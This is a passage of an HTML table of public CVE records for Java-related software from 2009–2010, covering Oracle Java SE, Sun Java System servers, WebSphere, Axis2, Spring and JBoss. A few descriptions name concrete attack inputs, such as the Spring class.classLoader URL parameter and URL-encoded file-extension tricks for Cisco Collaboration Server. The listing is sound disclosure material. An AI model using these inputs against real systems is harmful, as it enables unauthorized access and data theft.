	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3300">CVE-2010-3300</a></td>
		<td valign="top">It was found that all OWASP ESAPI for Java up to version 2.0 RC2 are vulnerable to padding oracle attacks.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3260">CVE-2010-3260</a></td>
		<td valign="top">oxf/xml/xerces/XercesSAXParserFactoryImpl.java in the xforms-server component in the XForms service in Orbeon Forms before 3.9 does not properly restrict DTDs in Ajax requests, which allows remote attackers to read arbitrary files or send HTTP requests to intranet servers via an entity declaration in conjunction with an entity reference, related to an "XML injection" issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3186">CVE-2010-3186</a></td>
		<td valign="top">IBM WebSphere Application Server (WAS) 7.x before 7.0.0.13, and WebSphere Application Server Feature Pack for Web Services 6.1.0.9 through 6.1.0.32, when a JAX-WS application is used, does not properly handle an IncludeTimestamp setting in the WS-Security policy, which has unspecified impact and remote attack vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-2419">CVE-2010-2419</a></td>
		<td valign="top">Unspecified vulnerability in the Java Virtual Machine component in Oracle Database Server 10.1.0.5, 10.2.0.4, 11.1.0.7, and 11.2.0.1 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-2414">CVE-2010-2414</a></td>
		<td valign="top">Unspecified vulnerability in the (1) Sun Convergence 1 and (2) Sun Java Communications Suite 7 components in Oracle Sun Products Suite 1.0 and 7.0 allows remote attackers to affect confidentiality via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-2397">CVE-2010-2397</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Sun Java System Application Server 8.0, 8.1, and 8.2; and GlassFish Enterprise Server 2.1.1; allows local users to affect confidentiality and integrity, related to the GUI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-2385">CVE-2010-2385</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Sun Java System Web Proxy Server 4.0.13 allows remote attackers to affect confidentiality and integrity via unknown vectors related to Administration Server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-2236">CVE-2010-2236</a></td>
		<td valign="top">The monitoring probe display in spacewalk-java before 2.1.148-1 and Red Hat Network (RHN) Satellite 4.0.0 through 4.2.0 and 5.1.0 through 5.3.0, and Proxy 5.3.0, allows remote authenticated users with permissions to administer monitoring probes to execute arbitrary code via unspecified vectors, related to backticks.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-2103">CVE-2010-2103</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in axis2-admin/axis2-admin/engagingglobally in the administration console in Apache Axis2/Java 1.4.1, 1.5.1, and possibly other versions, as used in SAP Business Objects 12, 3com IMC, and possibly other products, allows remote attackers to inject arbitrary web script or HTML via the modules parameter.  NOTE: some of these details are obtained from third party information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-2057">CVE-2010-2057</a></td>
		<td valign="top">shared/util/StateUtils.java in Apache MyFaces 1.1.x before 1.1.8, 1.2.x before 1.2.9, and 2.0.x before 2.0.1 uses an encrypted View State without a Message Authentication Code (MAC), which makes it easier for remote attackers to perform successful modifications of the View State via a padding oracle attack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-1929">CVE-2010-1929</a></td>
		<td valign="top">Multiple stack-based buffer overflows in the jclient._Java_novell_jclient_JClient_defineClass@20 function in jclient.dll in the Tomcat web server in Novell iManager 2.7, 2.7.3, and 2.7.3 FTF2 allow remote authenticated users to execute arbitrary code via the (1) EnteredClassID or (2) NewClassName parameter to nps/servlet/webacc.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-1871">CVE-2010-1871</a></td>
		<td valign="top">JBoss Seam 2 (jboss-seam2), as used in JBoss Enterprise Application Platform 4.3.0 for Red Hat Linux, does not properly sanitize inputs for JBoss Expression Language (EL) expressions, which allows remote attackers to execute arbitrary code via a crafted URL.  NOTE: this is only a vulnerability when the Java Security Manager is not properly configured.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-1632">CVE-2010-1632</a></td>
		<td valign="top">Apache Axis2 before 1.5.2, as used in IBM WebSphere Application Server (WAS) 7.0 through 7.0.0.12, IBM Feature Pack for Web Services 6.1.0.9 through 6.1.0.32, IBM Feature Pack for Web 2.0 1.0.1.0, Apache Synapse, Apache ODE, Apache Tuscany, Apache Geronimo, and other products, does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service (CPU and memory consumption) via a crafted DTD, as demonstrated by an entity declaration in a request to the Synapse SimpleStockQuoteService.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-1622">CVE-2010-1622</a></td>
		<td valign="top">SpringSource Spring Framework 2.5.x before 2.5.6.SEC02, 2.5.7 before 2.5.7.SR01, and 3.0.x before 3.0.3 allows remote attackers to execute arbitrary code via an HTTP request containing class.classLoader.URLs[0]=jar: followed by a URL of a crafted .jar file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-1423">CVE-2010-1423</a></td>
		<td valign="top">Argument injection vulnerability in the URI handler in (a) Java NPAPI plugin and (b) Java Deployment Toolkit in Java 6 Update 10, 19, and other versions, when running on Windows and possibly on Linux, allows remote attackers to execute arbitrary code via the (1) -J or (2) -XXaltjvm argument to javaws.exe, which is processed by the launch method.  NOTE: some of these details are obtained from third party information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-1330">CVE-2010-1330</a></td>
		<td valign="top">The regular expression engine in JRuby before 1.4.1, when $KCODE is set to 'u', does not properly handle characters immediately after a UTF-8 character, which allows remote attackers to conduct cross-site scripting (XSS) attacks via a crafted string.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-1227">CVE-2010-1227</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Sun Java System Communications Express 6.2 and 6.3 allows remote attackers to inject arbitrary web script or HTML via the subject field of a message, as demonstrated by a subject containing an IMG element with a SRC attribute that performs a cross-site request forgery (CSRF) attack involving the cmd and argv parameters to cmd.msc.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0897">CVE-2010-0897</a></td>
		<td valign="top">Unspecified vulnerability in the Sun Java System Directory Server component in Oracle Sun Product Suite 5.2, 6.0, 6.1, 6.2, 6.3, and 6.3.1 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Directory Service Markup Language.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0894">CVE-2010-0894</a></td>
		<td valign="top">Unspecified vulnerability in the Sun Java System Access Manager component in Oracle Sun Product Suite 7.1, 7 2005Q4, and OpenSSO Enterprise 8.0 allows remote attackers to affect confidentiality and integrity via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0887">CVE-2010-0887</a></td>
		<td valign="top">Unspecified vulnerability in the New Java Plug-in component in Oracle Java SE and Java for Business JDK and JRE 6 Update 18 and 19 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0886">CVE-2010-0886</a></td>
		<td valign="top">Unspecified vulnerability in the Java Deployment Toolkit component in Oracle Java SE and Java for Business JDK and JRE 6 Update 10 through 19 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0885">CVE-2010-0885</a></td>
		<td valign="top">Unspecified vulnerability in the Sun Java System Communications Express component in Oracle Sun Product Suite 6 2005Q4 (6.2) and and 6.3 allows remote authenticated users to affect confidentiality via unknown vectors related to Address Book.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0850">CVE-2010-0850</a></td>
		<td valign="top">Unspecified vulnerability in the Java 2D component in Oracle Java SE and Java for Business 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0849">CVE-2010-0849</a></td>
		<td valign="top">Unspecified vulnerability in the Java 2D component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, 1.4.2_25, and 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the March 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is a heap-based buffer overflow in a decoding routine used by the JPEGImageDecoderImpl interface, which allows code execution via a crafted JPEG image.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0848">CVE-2010-0848</a></td>
		<td valign="top">Unspecified vulnerability in the Java 2D component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, 1.4.2_25, and 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0847">CVE-2010-0847</a></td>
		<td valign="top">Unspecified vulnerability in the Java 2D component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, 1.4.2_25, and 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the March 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is a heap-based buffer overflow that allows arbitrary code execution via a crafted image.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0846">CVE-2010-0846</a></td>
		<td valign="top">Unspecified vulnerability in the ImageIO component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, 1.4.2_25, and 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the March 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is a heap-based buffer overflow that allows remote attackers to execute arbitrary code, related to an "invalid assignment" and inconsistent length values in a JPEG image encoder (JPEGImageEncoderImpl).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0845">CVE-2010-0845</a></td>
		<td valign="top">Unspecified vulnerability in the HotSpot Server component in Oracle Java SE and Java for Business 6 Update 18, 5.0, Update, and 23 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0844">CVE-2010-0844</a></td>
		<td valign="top">Unspecified vulnerability in the Sound component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, 1.4.2_25, and 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the March 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is for improper parsing of a crafted MIDI stream when creating a MixerSequencer object, which causes a pointer to be corrupted and allows a NULL byte to be written to arbitrary memory.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0843">CVE-2010-0843</a></td>
		<td valign="top">Unspecified vulnerability in the Sound component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, 1.4.2_25, and 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the March 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is related to XNewPtr and improper handling of an integer parameter when allocating heap memory in the com.sun.media.sound libraries, which allows remote attackers to execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0842">CVE-2010-0842</a></td>
		<td valign="top">Unspecified vulnerability in the Sound component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, 1.4.2_25, and 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the March 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is an uncontrolled array index that allows remote attackers to execute arbitrary code via a MIDI file with a crafted MixerSequencer object, related to the GM_Song structure.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0841">CVE-2010-0841</a></td>
		<td valign="top">Unspecified vulnerability in the ImageIO component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, and 1.4.2_25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the March 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is an integer overflow in the Java Runtime Environment that allows remote attackers to execute arbitrary code via a JPEG image that contains subsample dimensions with large values, related to JPEGImageReader and "stepX".

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0840">CVE-2010-0840</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, and 1.4.2_25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the March 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is related to improper checks when executing privileged methods in the Java Runtime Environment (JRE), which allows attackers to execute arbitrary code via (1) an untrusted object that extends the trusted class but has not modified a certain method, or (2) "a similar trust issue with interfaces," aka "Trusted Methods Chaining Remote Code Execution Vulnerability."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0839">CVE-2010-0839</a></td>
		<td valign="top">Unspecified vulnerability in the Sound component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, 1.4.2_25, and 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0838">CVE-2010-0838</a></td>
		<td valign="top">Unspecified vulnerability in the Java 2D component in Oracle Java SE and Java for Business 6 Update 18, 5.0, Update, and 23 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the March 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is a stack-based buffer overflow using an untrusted size value in the readMabCurveData function in the CMM module in the JVM.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0837">CVE-2010-0837</a></td>
		<td valign="top">Unspecified vulnerability in the Pack200 component in Oracle Java SE and Java for Business 6 Update 18, 5.0, Update, and 23 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0786">CVE-2010-0786</a></td>
		<td valign="top">The Web Services Security component in IBM WebSphere Application Server (WAS) 7.0 before 7.0.0.13 does not properly implement the Java API for XML Web Services (aka JAX-WS), which allows remote attackers to cause a denial of service (data corruption) via a crafted JAX-WS request that leads to incorrectly encoded data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0770">CVE-2010-0770</a></td>
		<td valign="top">IBM WebSphere Application Server (WAS) 6.0 before 6.0.2.41, 6.1 before 6.1.0.31, and 7.0 before 7.0.0.9 allows remote authenticated users to cause a denial of service (ORB ListenerThread hang) by aborting an SSL handshake.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0708">CVE-2010-0708</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in (1) ns-slapd and (2) slapd.exe in Sun Directory Server Enterprise Edition 7.0, Sun Java System Directory Server 5.2, and Sun Java System Directory Server Enterprise Edition 6.0 through 6.3.1 allow remote attackers to cause a denial of service (daemon crash) via a crafted LDAP search request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0642">CVE-2010-0642</a></td>
		<td valign="top">Cisco Collaboration Server (CCS) 5 allows remote attackers to read the source code of JHTML files via URL encoded characters in the filename extension, as demonstrated by (1) changing .jhtml to %2Ejhtml, (2) changing .jhtml to .jhtm%6C, (3) appending %00 after .jhtml, and (4) appending %c0%80 after .jhtml, related to the (a) doc/docindex.jhtml, (b) browserId/wizardForm.jhtml, (c) webline/html/forms/callback.jhtml, (d) webline/html/forms/callbackICM.jhtml, (e) webline/html/agent/AgentFrame.jhtml, (f) webline/html/agent/default/badlogin.jhtml, (g) callme/callForm.jhtml, (h) webline/html/multichatui/nowDefunctWindow.jhtml, (i) browserId/wizard.jhtml, (j) admin/CiscoAdmin.jhtml, (k) msccallme/mscCallForm.jhtml, and (l) webline/html/admin/wcs/LoginPage.jhtml components.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0539">CVE-2010-0539</a></td>
		<td valign="top">Integer signedness error in the window drawing implementation in Apple Java for Mac OS X 10.5 before Update 7 and Java for Mac OS X 10.6 before Update 2 allows remote attackers to execute arbitrary code or cause a denial of service (application crash) via a crafted applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0538">CVE-2010-0538</a></td>
		<td valign="top">Apple Java for Mac OS X 10.5 before Update 7 and Java for Mac OS X 10.6 before Update 2 do not properly handle mediaLibImage objects, which allows remote attackers to execute arbitrary code or cause a denial of service (out-of-bounds memory access and application crash) via a crafted applet, related to the com.sun.medialib.mlib package.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0523">CVE-2010-0523</a></td>
		<td valign="top">Wiki Server in Apple Mac OS X 10.5.8 does not restrict the file types of uploaded files, which allows remote attackers to obtain sensitive information or possibly have unspecified other impact via a crafted file, as demonstrated by a Java applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0389">CVE-2010-0389</a></td>
		<td valign="top">The admin server in Sun Java System Web Server 7.0 Update 6 allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via an HTTP request that lacks a method token.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0388">CVE-2010-0388</a></td>
		<td valign="top">Format string vulnerability in the WebDAV implementation in webservd in Sun Java System Web Server 7.0 Update 6 allows remote attackers to cause a denial of service (daemon crash) and possibly have unspecified other impact via format string specifiers in the encoding attribute of the XML declaration in a PROPFIND request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0387">CVE-2010-0387</a></td>
		<td valign="top">Multiple heap-based buffer overflows in (1) webservd and (2) the admin server in Sun Java System Web Server 7.0 Update 7 allow remote attackers to cause a denial of service (daemon crash) and possibly have unspecified other impact via a long string in an "Authorization: Digest" HTTP header.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0386">CVE-2010-0386</a></td>
		<td valign="top">The default configuration of Sun Java System Application Server 7 and 7 2004Q2 enables the HTTP TRACE method, which makes it easier for remote attackers to steal cookies and authentication credentials via a cross-site tracing (XST) attack, a related issue to CVE-2004-2763 and CVE-2005-3398.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0361">CVE-2010-0361</a></td>
		<td valign="top">Stack-based buffer overflow in the WebDAV implementation in webservd in Sun Java System Web Server (aka SJWS) 7.0 Update 7 allows remote attackers to cause a denial of service (daemon crash) and possibly have unspecified other impact via a long URI in an HTTP OPTIONS request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0360">CVE-2010-0360</a></td>
		<td valign="top">Sun Java System Web Server (aka SJWS) 7.0 Update 7 allows remote attackers to overwrite memory locations in the heap, and discover the contents of memory locations, via a malformed HTTP TRACE request that includes a long URI and many empty headers, related to an "overflow." NOTE: this might overlap CVE-2010-0272 and CVE-2010-0273.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0313">CVE-2010-0313</a></td>
		<td valign="top">The core_get_proxyauth_dn function in ns-slapd in Sun Java System Directory Server Enterprise Edition 7.0 allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via a crafted LDAP Search Request message.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0311">CVE-2010-0311</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Identity Manager (aka IdM) 8.1.0.5 and 8.1.0.6, when Sun Java System Access Manager, OpenSSO Enterprise 8.0, or IBM Tivoli Access Manager is used, allows remote attackers to obtain administrative access via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0273">CVE-2010-0273</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Web Server 7.0 Update 6 on Linux allows remote attackers to execute arbitrary code by sending a process memory address and crafted data to TCP port 80, as demonstrated by the vd_sjws2 module in VulnDisco.  NOTE: as of 20100106, this disclosure has no actionable information. However, because the VulnDisco author is a reliable researcher, the issue is being assigned a CVE identifier for tracking purposes.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0272">CVE-2010-0272</a></td>
		<td valign="top">Heap-based buffer overflow in Sun Java System Web Server 7.0 Update 6 on Linux allows remote attackers to discover process memory locations via crafted data to TCP port 80, as demonstrated by the vd_sjws2 module in VulnDisco.  NOTE: as of 20100106, this disclosure has no actionable information. However, because the VulnDisco author is a reliable researcher, the issue is being assigned a CVE identifier for tracking purposes.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0095">CVE-2010-0095</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, and 1.4.2_25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2010-0093.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0094">CVE-2010-0094</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE and Java for Business 6 Update 18 and 5.0 Update 23 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the March 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is due to missing privilege checks during deserialization of RMIConnectionImpl objects, which allows remote attackers to call system-level Java functions via the ClassLoader of a constructor that is being deserialized.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0093">CVE-2010-0093</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, and 1.4.2_25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2010-0095.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0092">CVE-2010-0092</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE and Java for Business 6 Update 18, and 5.0 Update 23 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0091">CVE-2010-0091</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, and 1.4.2_25 allows remote attackers to affect confidentiality via unknown vectors, a different vulnerability than CVE-2010-0084.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0090">CVE-2010-0090</a></td>
		<td valign="top">Unspecified vulnerability in the Java Web Start, Java Plug-in component in Oracle Java SE and Java for Business 6 Update 18 allows remote attackers to affect integrity and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0089">CVE-2010-0089</a></td>
		<td valign="top">Unspecified vulnerability in the Java Web Start, Java Plug-in component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, and 1.4.2_25 allows remote attackers to affect availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0088">CVE-2010-0088</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, 1.4.2_25, and 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2010-0085.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0087">CVE-2010-0087</a></td>
		<td valign="top">Unspecified vulnerability in the Java Web Start, Java Plug-in component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, 1.4.2_25, and 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0085">CVE-2010-0085</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, 1.4.2_25, and 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2010-0088.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0084">CVE-2010-0084</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, and 1.4.2_25 allows remote attackers to affect confidentiality via unknown vectors, a different vulnerability than CVE-2010-0091.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-0082">CVE-2010-0082</a></td>
		<td valign="top">Unspecified vulnerability in the HotSpot Server component in Oracle Java SE and Java for Business 6 Update 18, 5.0 Update 23, 1.4.2_25, and 1.3.1_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-5135">CVE-2009-5135</a></td>
		<td valign="top">The Java XML parser in Echo before 2.1.1 and 3.x before 3.0.b6 allows remote attackers to read arbitrary files via a request containing an external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-4875">CVE-2009-4875</a></td>
		<td valign="top">FCKeditor.Java 2.4 allows remote attackers to cause a denial of service (infinite loop) via a malformed request parameter that contains "ctrl" characters.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-4776">CVE-2009-4776</a></td>
		<td valign="top">Buffer overflow in Hitachi Cosminexus V4 through V8, Processing Kit for XML, and Developer's Kit for Java, as used in products such as uCosminexus, Electronic Form Workflow, Groupmax, and IBM XL C/C++ Enterprise Edition 7 and 8, allows remote attackers to have an unknown impact via vectors related to the use of GIF image processing APIs by a Java application, and a different issue from CVE-2007-3794.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-4611">CVE-2009-4611</a></td>
